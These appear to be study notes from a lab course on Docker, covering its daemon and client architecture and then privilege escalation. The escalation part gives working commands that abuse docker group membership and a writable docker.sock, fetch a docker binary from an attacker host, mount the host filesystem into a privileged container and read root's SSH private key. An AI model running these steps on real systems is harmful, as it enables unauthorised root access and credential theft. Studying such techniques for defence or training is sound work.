
---
It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.

## Architecture

---
Two primary components:
	- The Docker daemon.
	- The Docker client.

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

### Docker Daemon

---
aka Docker server, a critical part in container management and orchestration. 

Several essential responsibilities:
	- running Docker containers.
	- interacting with Docker containers.
	- managing Docker containers on the host system.
	- Captures container logs
	- Provides insight into container performance and troubleshoot issues.

### Docker Clients

---
We issue command through the *Docker Client*.

## PrevEsc

---

### Docker Group

---
Docker group allows user to use and control the Docker daemon.
```bash
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```
Alternatively, Docker may have SUID set, or we are in the `Sudoers` file, which permits us to run `docker` as root.


### Docker Shared Directories

---
Shared directories can bridge the gap between the host system and the container's filesystem.

### Docker Sockets

---
A special file that allows us and processes to communication with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup.

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different.
#### Case 1
When you're not in a container
```bash
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

```bash
docker-user@nix02:~$ docker image ls

REPOSITORY TAG  IMAGE        ID CREATED
SIZE
ubuntu     0.04 20fffa419e3a 2  days ago
72.8MB
```

Constrain: You can write `/var/run/docker.sock`

```bash
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

#### Case 2
When you're in a container
```bash
htb-student@container:~/app$ ls -la


total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root root 4096 Jun 30 15:12 ..
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```
Unix socket is a file, network socket is a port.

```bash
htb-student@container:/tmp$ wget https://<kali_ip>:443/docker -O docker
#-O : Output Document, aka name.
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker

htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID IMAGE    COMMAND              CREATED       STATUS
PORTS     NAMES
3fe8a4782311 main_app "/docker-entry.s..." 3 days ago Up 12 minutes
443/tcp   app
<SNIP>
```

Create our own Docker container that maps the host's root directory (`/`) to the `/hostsystem` directory on the container.
```bash
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
#run : Create a new container
#-rm : Auto remove the container when the container stops.(Anti-forensics)
#-d : Detached mode, run in the background.
#--privileged : Like root.
#-v /:/hostsystem : Mount / to /hostsystem
#Use main_app to be the image file.
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID IMAGE    COMMAND              CREATED        STATUS
PORTS     NAMES
7ae3bcc818af main_app "/docker-entry.s..." 12 seconds ago Up 8 seconds
443/tcp   app
3fe8a4782311 main_app "/docker-entry.s..." 3 days ago     Up 17
minutes   443/tcp app
<SNIP>
```

Log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.
```bash
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
#exec : Tell docker I want to execute commands at the certain container.
#-it : Interactive + TTY

root@7ae3bcc818af:~\# cat /hostsystem/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY----- 
<SNIP>
```






























